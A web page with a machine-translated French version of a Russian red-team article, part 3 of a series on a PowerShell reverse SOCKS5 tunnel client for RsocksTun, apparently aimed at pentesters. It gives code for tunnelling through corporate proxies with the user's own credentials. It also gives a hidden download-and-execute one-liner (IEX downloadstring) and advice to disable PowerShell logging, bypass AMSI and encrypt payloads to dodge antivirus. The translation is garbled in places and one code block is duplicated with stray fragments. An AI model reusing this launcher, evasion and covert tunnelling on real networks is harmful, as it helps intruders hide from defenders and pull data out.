<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßöüèΩ üèÇüèΩ üîé Nous √©crivons le proxy Reverse socks5 sur PowerShell. Partie 3 üõåüèº üéπ üêç</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="L'histoire de la recherche et du d√©veloppement en 3 parties. La partie 3 est pratique. 
 Il existe de nombreux h√™tres - encore plus d'avantages 

 Les...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Nous √©crivons le proxy Reverse socks5 sur PowerShell. Partie 3</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/454254/">  L'histoire de la recherche et du d√©veloppement en 3 parties.  La partie 3 est pratique. <br>  Il existe de nombreux h√™tres - encore plus d'avantages <br><br>  Les articles pr√©c√©dents du cycle peuvent √™tre trouv√©s <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> =) <br><br><h3>  V√©rification de bataille </h3><br>  Testons maintenant le fonctionnement de notre script en pratique.  Pour ce faire, essayez de lancer le tunnel inverse de la machine virtuelle (Windows 7 .net 4.7) vers le VPS Linux sur Digital Ocean, puis, en l'utilisant, nous reviendrons sur Win7.  Dans ce cas, nous simulons une situation o√π Windows 7 est la machine du client, Linux VPS est notre serveur. <br><a name="habracut"></a><br>  Sur VPS (dans notre cas Ubuntu 18.04), nous installons et configurons la partie serveur de RsocksTun: <br><br><ul><li>  d√©finir le golang: apt install golang </li><li>  prendre les sources de rsockstun de gita: <br>  git clone <a href="">github.com/mis-team/rsockstun.git</a> / opt / rstun </li><li>  installer les d√©pendances: <br>  allez chercher github.com/hashicorp/yamux <br>  allez chercher github.com/armon/go-socks5 <br>  allez sur github.com/ThomsonReutersEikon/go-ntlm/ntlm </li><li>  compiler selon le manuel: cd / opt / rstun;  va construire </li><li>  g√©n√©rer un certificat SSL: <br>  openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes </li><li>  on d√©marre la partie serveur: </li></ul><br><img src="https://habrastorage.org/webt/c6/rx/45/c6rx45gxq1qcabdtdvdczplgq8m.png"><br><br><ul><li>  Nous commen√ßons notre script sur le client, en lui indiquant le serveur √† connecter, le port et le mot de passe: </li></ul><br><img src="https://habrastorage.org/webt/f2/hz/ks/f2hzksob9ctx8qsvrt-p1ycg0fe.png"><br><br><ul><li>  utiliser le port sur√©lev√© du serveur Socks5 pour aller √† mail.ru </li></ul><br><img src="https://habrastorage.org/webt/fi/ye/lj/fiyeljrteulwjd0xfihggiovhsk.png"><br><br>  Comme vous pouvez le voir sur les captures d'√©cran, notre script fonctionne.  Nous √©tions heureux, nous avons √©rig√© mentalement un monument pour nous-m√™mes et avons d√©cid√© que tout √©tait parfait.  Mais ... <br><br><h3>  Gestion des erreurs </h3><br>  Mais tout n'est pas aussi fluide que nous le souhaiterions ... <br><br>  Pendant le fonctionnement du script, un moment d√©sagr√©able a √©t√© d√©couvert: si le script fonctionne via une connexion pas tr√®s rapide au serveur, l'erreur indiqu√©e dans la figure ci-dessous peut se produire lors du transfert de donn√©es volumineuses <br><br><img src="https://habrastorage.org/webt/kb/sd/bn/kbsdbnzfegxlymwrz8bcygd7qeo.png"><br><br>  Apr√®s avoir √©tudi√© cette erreur, nous voyons que lorsque nous recevons un message keepalive (alors que les donn√©es sont toujours transmises au serveur), nous essayons d'√©crire simultan√©ment une r√©ponse √† keepalive sur le socket, ce qui provoque une erreur. <br><br>  Pour corriger la situation, nous devons attendre la fin du transfert de donn√©es, puis envoyer une r√©ponse √† keepalive.  Mais ici, un autre probl√®me peut survenir: si un message keepalive arrive en ce moment entre l'envoi d'un en-t√™te de 12 octets et l'envoi de donn√©es, alors nous d√©truirons la structure du paquet ymx.  Par cons√©quent, une solution plus correcte serait de transf√©rer toutes les fonctionnalit√©s d'envoi de donn√©es √† l'int√©rieur de yamuxScript, qui traite les √©v√©nements pour l'envoi s√©quentiel et il n'y aura pas de telles situations. <br><br>  En m√™me temps, pour demander √† yamuxScript d'envoyer des r√©ponses keepalive, nous pouvons utiliser notre ArrayList StopFlag [0] partag√© - l'index z√©ro n'est pas utilis√©, car  la num√©rotation des flux yamux commence par 1. Dans cet index, nous passerons dans yamuxScript la valeur ping re√ßue dans le message keepalive.  Par d√©faut, la valeur sera -1, ce qui signifie qu'aucune transmission n'est n√©cessaire.  YamuxScript v√©rifiera cette valeur, et s'il s'agit de 0 (le premier ping keepalive = 0) ou plus, alors envoyez la valeur transmise √† la r√©ponse keepalive: <br><br><pre><code class="plaintext hljs">if ($StopFlag[0] -ge 0){ #got yamux keepalive. we have to reply $outbuf = [byte[]](0x00,0x02,0x00,0x02,0x00,0x00,0x00,0x00) + [bitconverter]::getbytes([int32]$StopFlag[0])[3..0] $state.tcpstream.Write($outbuf,0,12) $state.tcpstream.flush() $StopFlag[0] = -1 }</code> </pre> <br>  Nous devons √©galement exclure l'envoi dans le thread principal du programme d'une r√©ponse √† l'indicateur YMX SYN. <br><br>  Pour ce faire, nous devons √©galement transf√©rer cette fonctionnalit√© √† l'int√©rieur de yamuxScript, mais comme le serveur yamux ne n√©cessite pas d'envoyer de r√©ponse √† YMX SYN et commence imm√©diatement √† envoyer des donn√©es, nous d√©sactivons simplement l'envoi de ce paquet et c'est tout: <br><br><pre> <code class="plaintext hljs">#$outbuf = [byte[]](0x00,0x01,0x00,0x02,$ymxstream[3],$ymxstream[2],$ymxstream[1],$ymxstream[0],0x00,0x00,0x00,0x00) #$tcpstream.Write($outbuf,0,12)</code> </pre> <br>  Apr√®s cela, le transfert de gros morceaux de donn√©es fonctionne tr√®s bien. <br><br><h3>  Prise en charge du proxy </h3><br>  R√©fl√©chissons maintenant √† la fa√ßon dont nous pouvons faire fonctionner notre client via un serveur proxy. <br><br>  Commen√ßons par les bases.  En th√©orie, le proxy http (√† savoir, les proxy http fonctionnent dans la plupart des r√©seaux d'entreprise) est con√ßu pour fonctionner avec le protocole HTTP, et il semble que http ne sent pas le n√¥tre.  Mais dans la nature, en plus de http, il y a aussi https et votre navigateur peut parfaitement se connecter aux sites https via http normal - non? <br><br>  La raison en est le mode de fonctionnement sp√©cial du serveur proxy - le mode CONNECT.  Ainsi, si le navigateur souhaite se connecter au serveur gmail via https via un serveur proxy, il envoie une demande CONNECT au serveur proxy, qui indique l'h√¥te et le port de destination. <br><br><pre> <code class="plaintext hljs">CONNECT gmail.com:443 HTTP/1.1 Host: gmail.com:443 Proxy-Connection: Keep-Alive</code> </pre> <br>  Apr√®s une connexion r√©ussie au serveur gmail, le proxy renvoie une r√©ponse 200 OK. <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK</code> </pre> <br>  Apr√®s cela, toutes les donn√©es du navigateur sont directement transmises au serveur et vice versa.  En termes simples, un proxy connecte directement deux sockets r√©seau l'une √† l'autre - une socket de navigateur et une socket de serveur gmail.  Apr√®s cela, le navigateur commence √† √©tablir une connexion SSL avec le serveur Gmail et √† travailler directement avec lui. <br><br>  En transf√©rant ce qui pr√©c√®de √† notre client, nous devons d'abord √©tablir une connexion avec le serveur proxy, envoyer un paquet http indiquant la m√©thode CONNECT et l'adresse de notre serveur yamux, attendre une r√©ponse avec le code 200, puis proc√©der √† l'√©tablissement d'une connexion SSL. <br><br>  En principe, il n'y a rien de particuli√®rement compliqu√©.  C'est ainsi que le m√©canisme de connexion via le serveur proxy est impl√©ment√© dans le client golang rsockstun. <br><br>  Les principales difficult√©s commencent lorsque le serveur proxy n√©cessite une autorisation ntlm ou kerberos lors de la connexion √† lui-m√™me. <br><br>  Dans ce cas, le serveur proxy renvoie le code 407 et l'en-t√™te http ntlm sous forme de cha√Æne base64 <br><br><pre> <code class="plaintext hljs">HTTP/1.1 407 Proxy Authentication Required Proxy-Authenticate: NTLM TlRMTVNTUAACAAAAAAAAADgAAABVgphianXk2614u2AAAAAAAAAAAKIAogA4AAAABQEoCgAAAA8CAA4AUgBFAFUAVABFAFIAUwABABwAVQBLAEIAUAAtAEMAQgBUAFIATQBGAEUAMAA2AAQAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQAAwA0AHUAawBiAHAALQBjAGIAdAByAG0AZgBlADAANgAuAFIAZQB1AHQAZQByAHMALgBuAGUAdAAFABYAUgBlAHUAdABlAHIAcwAuAG4AZQB0AAAAAAA= Date: Tue, 28 May 2019 14:06:15 GMT Content-Length: 0</code> </pre> <br>  Pour une autorisation r√©ussie, nous devons d√©coder cette ligne, en supprimer les param√®tres (tels que ntlm-challenge, nom de domaine).  Ensuite, en utilisant ces donn√©es, ainsi que le nom d'utilisateur et son hachage ntlm, nous devons g√©n√©rer une r√©ponse ntlm, la recoder en base64 et la renvoyer au serveur proxy. <br><br><pre> <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> + UpsHCJmpIGttOj1VN + 5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA == <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> </pre> <br>  Mais ce n'est pas si mal.  Le fait est que lorsque nous ex√©cutons le script, nous ne connaissons ni le nom de l'utilisateur actuel ni son hachage de mot de passe ntlm.  Ainsi, pour l'autorisation sur le serveur proxy, nous devons trouver le nom d'utilisateur / passe ailleurs. <br><br>  Th√©oriquement, nous pouvons impl√©menter cette fonctionnalit√© dans un script (√† partir de la d√©finition manuelle des param√®tres d'authentification, comme cela est fait dans le client GoLang, et se terminant par l'utilisation d'un vidage de m√©moire de processus LSASS, comme cela est fait dans mimikatz), mais notre script deviendra alors d'une taille et d'une complexit√© incroyables, en particulier que ces sujets d√©passent le cadre de cet article. <br><br>  Nous avons pens√© et d√©cid√© que nous irions dans l'autre sens ... <br><br>  Au lieu de faire une autorisation manuellement, nous utiliserons la fonctionnalit√© int√©gr√©e pour travailler avec un serveur proxy de la classe HTTPWebRequest.  Mais dans ce cas, nous devrons changer le code de notre serveur RsocksTun - apr√®s tout, lorsqu'il re√ßoit une demande du client, il n'attend qu'une ligne avec un mot de passe et il recevra une demande HTTP compl√®te.  En principe, la modification du c√¥t√© serveur de rsoskstun n'est pas si difficile.  Il suffit de d√©cider dans quelle partie de la demande http nous transmettrons le mot de passe (par exemple, ce sera l'en-t√™te http XAuth) et d'impl√©menter la fonctionnalit√© de traitement de la demande http, de v√©rifier notre en-t√™te avec un mot de passe et d'envoyer une r√©ponse http de retour (200 OK).  Nous avons ajout√© cette fonctionnalit√© √† une branche distincte du projet RSocksTun. <br><br>  Apr√®s avoir modifi√© la partie Golang du RSocksTun (serveur et client), nous commencerons √† ajouter la fonctionnalit√© de travailler avec un serveur proxy √† notre script.  Le code le plus simple pour la classe HttpWebRequest pour la connexion √† un serveur Web via un proxy ressemble √† ceci: <br><br><pre> <code class="plaintext hljs">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $request = [System.Net.HttpWebRequest]::Create("https://gmail.com:443") $request.Method = "GET" $request.Headers.Add("Xauth","password") $proxy = new-object system.net.webproxy('http://127.0.0.1:8080'); $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials $request.Proxy = $proxy try {$serverResponse = $request.GetResponse()} catch {write-host "Can not connect"; exit}</code> </pre> <br>  Dans ce cas, nous cr√©ons une instance de la classe HttpWebRequest, d√©finissons les propri√©t√©s Proxy et Credentials, ajoutons l'en-t√™te http XAuth personnalis√©.  En cons√©quence, notre demande aux serveurs Google passera par le serveur proxy 127.0.0.1:8080.  Si le proxy demande une autorisation, Windows lui-m√™me "r√©cup√©rera" les cr√©dits de l'utilisateur actuel et ins√©rera les en-t√™tes http correspondants. <br><br>  Au lieu de sp√©cifier un serveur proxy manuellement, nous pouvons utiliser les param√®tres syst√®me du serveur proxy: <br><br><pre> <code class="plaintext hljs">$proxy = [System.Net.WebRequest]::GetSystemWebProxy()</code> </pre> <br>  Donc, apr√®s nous √™tre connect√©s via un serveur proxy √† notre serveur rsockstun et avoir re√ßu une r√©ponse HTTP avec le code 200, nous devons faire une petite astuce, √† savoir, √† partir de la classe HTTPWebRequest, obtenir un objet de flux pour la lecture / √©criture comme $ tcpConnection.getStream ().  Nous le faisons √† travers le m√©canisme d'inspection de r√©flexion .Net (pour ceux qui veulent comprendre ce m√©canisme plus en d√©tail, partagez le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">lien</a> ).  Cela nous permet d'acc√©der aux m√©thodes et propri√©t√©s des classes sous-jacentes: <br><br><pre> <code class="plaintext hljs">#--------------------------------------------------------------------------------- # Reflection inspection to retrieve and reuse the underlying networkStream instance $responseStream = $serverResponse.GetResponseStream() $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance" $rsType = $responseStream.GetType() $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags) $connection = $connectionProperty.GetValue($responseStream, $null) $connectionType = $connection.GetType() $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags) $tcpStream = $networkStreamProperty.GetValue($connection, $null)</code> </pre> <br>  Ainsi, nous avons obtenu le m√™me flux de socket, qui est connect√© par le serveur proxy √† notre serveur yamux et avec lequel nous pouvons effectuer des op√©rations de lecture / √©criture. <br><br>  Un autre point que nous devons prendre en consid√©ration est le m√©canisme de surveillance de l'√©tat de la connexion.  Comme nous travaillons via le serveur proxy et la classe HTTPWebRequest, nous n'avons pas la propri√©t√© $ tcpConnection.Connected et nous devons surveiller l'√©tat de la connexion d'une mani√®re ou d'une autre.  Nous pouvons le faire via un indicateur $ connected distinct, il est d√©fini sur $ true apr√®s avoir re√ßu le code 200 du serveur proxy et est r√©initialis√© sur $ false lorsqu'une exception se produit lors de la lecture √† partir du socket-stream: <br><br><pre> <code class="plaintext hljs">try { $num = $tcpStream.Read($tmpbuffer,0,12) } catch {$connected=$false; break;} if ($num -eq 0 ) {$connected=$false; break;}</code> </pre> <br>  Sinon, notre code reste inchang√©. <br><br><h3>  Lancement en ligne </h3><br>  En r√®gle g√©n√©rale, toutes les personnes sens√©es ex√©cutent des scripts similaires √† partir de fichiers PS1, mais parfois (et en fait - presque toujours) dans le processus de pentest / redtime, il est n√©cessaire d'ex√©cuter des modules √† partir de la ligne de commande sans rien √©crire sur le disque, afin de ne laisser aucune trace .  De plus, powershell vous permet de le faire via la ligne de commande: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìc &lt;powershell code&gt; powershell.exe ‚Äìe &lt;base64 powershell code&gt;</code> </pre> <br>  Cependant, il ne faut pas vraiment se d√©tendre par rapport au secret du lancement et de l'ex√©cution des commandes.  Parce que, premi√®rement, tout le code PowerShell est enregistr√© √† l'aide des outils Windows standard dans les journaux d'√©v√©nements correspondants (Windows PowerShell et Microsoft-Windows-PowerShell / Operational), et deuxi√®mement, tout le code ex√©cut√© dans PowerShell passe par le m√©canisme AMSI ( Interface de scan anti-malware).  Une autre chose est que ces deux m√©canismes sont parfaitement co√ªteux avec des actions simples.  La d√©sactivation des magazines et le contournement de AMSI est un sujet de discussion distinct et nous en parlerons dans de futurs articles ou dans notre cha√Æne.  Mais maintenant, parlons d'autre chose. <br><br>  Le fait est que notre script a atteint des tailles assez impressionnantes et il est clair qu'il ne rentrera dans aucune ligne de commande (la limite de cmd dans Windows est de 8191 caract√®res).  Par cons√©quent, nous devons trouver un moyen d'ex√©cuter notre script sans l'√©crire sur le disque.  Et ici, les m√©thodes standard utilis√©es par les logiciels malveillants nous aident depuis pr√®s de 15 ans maintenant.  En bref, la r√®gle est simple - t√©l√©chargez et ex√©cutez.  L'essentiel est de ne pas le m√©langer =) <br>  La commande de t√©l√©chargement et de lancement ressemble √† ceci: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìw hidden -c "IEX ((new-object net.webclient).downloadstring('http://url.com/script.ps1'))"</code> </pre> <br>  Vous pouvez trouver encore plus d'options de lancement en ligne sur le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">git HarmJ0y</a> 'I' s: <br><br>  Bien s√ªr, avant de t√©l√©charger, vous devez prendre soin de d√©sactiver les journaux et de contourner ou de d√©sactiver AMSI.  Le script lui-m√™me doit √™tre chiffr√© avant le t√©l√©chargement, car  pendant le processus de t√©l√©chargement, il sera naturellement v√©rifi√© de haut en bas par votre (ou non votre =)) antivirus, et avant de commencer, il sera d√©chiffr√© en cons√©quence.  Comment faire cela - vous, le lecteur devrait d√©j√† le trouver vous-m√™me.  Cela d√©passe le cadre de ce sujet.  Mais nous connaissons un sp√©cialiste sympa dans ce domaine - le tout-puissant Google.  Il existe de nombreux exemples de chiffrement et de d√©chiffrement sur le r√©seau, ainsi que des exemples de contournement d'AMSI. <br><br><h3>  Conclusion √† toutes les parties </h3><br>  Dans le processus, nous avons pr√©sent√© au lecteur la technologie des ¬´tunnels inverses¬ª et leur utilisation pour les pentests, montr√© plusieurs exemples de tels tunnels et parl√© des avantages et des inconv√©nients de leur utilisation. <br><br>  Nous avons √©galement r√©ussi √† cr√©er un client PowerShell sur le serveur RsocksTun avec la capacit√©: <br><br><ul><li>  Connexions SSL </li><li>  autorisation sur le serveur; </li><li>  travailler avec yamux-server avec le support des pings keepalive; </li><li>  mode de fonctionnement multithread; </li><li>  prendre en charge le travail via un serveur proxy avec autorisation. </li></ul><br>  Vous pouvez trouver tout le code rsockstun (golang et powershell) dans la branche correspondante <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">sur notre github.</a>  La branche principale est con√ßue pour fonctionner sans serveur proxy, et la branche via_proxy est con√ßue pour fonctionner via des proxy et HTTP. <br><br>  Nous serons heureux d'entendre vos commentaires et suggestions sur l'am√©lioration du code et l'applicabilit√© du d√©veloppement dans la pratique. <br><br>  Ceci termine le cycle de nos articles de tunneling inverse.  Nous esp√©rons vraiment que vous √™tes int√©ress√© √† nous lire et que les informations sont utiles. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr454254/">https://habr.com/ru/post/fr454254/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr454240/index.html">Analyse des ondelettes. 3e partie</a></li>
<li><a href="../fr454242/index.html">"Regardez, quel jetpack j'ai!" "Ha, regardez quelle fus√©e j'ai!" (notes du championnat de fus√©e)</a></li>
<li><a href="../fr454246/index.html">Vari√©t√©s de coordonn√©es utilis√©es dans l'interface graphique Unity3d</a></li>
<li><a href="../fr454248/index.html">Les serfs √† l'√®re de l'intelligence artificielle</a></li>
<li><a href="../fr454252/index.html">M√™me les ressources Web d'organisations bien connues ne sont pas prot√©g√©es contre les erreurs des enfants.</a></li>
<li><a href="../fr454256/index.html">Quel est le probl√®me avec notre informatique</a></li>
<li><a href="../fr454260/index.html">Journ√©e des enfants Bad Code</a></li>
<li><a href="../fr454262/index.html">Pourquoi chaque Data Scientist devrait conna√Ætre Dask</a></li>
<li><a href="../fr454264/index.html">4 cha√Ænes Youtube sensibles sur les interviews techniques</a></li>
<li><a href="../fr454266/index.html">Dell et Alienware au Computex 2019: parler des principales innovations</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>